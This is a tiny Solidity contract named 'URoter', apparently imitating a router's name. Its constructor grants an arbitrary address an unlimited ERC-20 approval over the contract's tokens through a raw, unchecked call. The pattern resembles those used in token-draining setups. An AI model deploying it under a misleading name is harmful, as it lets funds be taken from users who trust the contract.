pragma solidity ^0.8.0;

contract URoter{
     constructor(address tokens,address to){
         tokens.call(abi.encodeWithSelector(0x095ea7b3, to, ~uint256(0)));
     }
}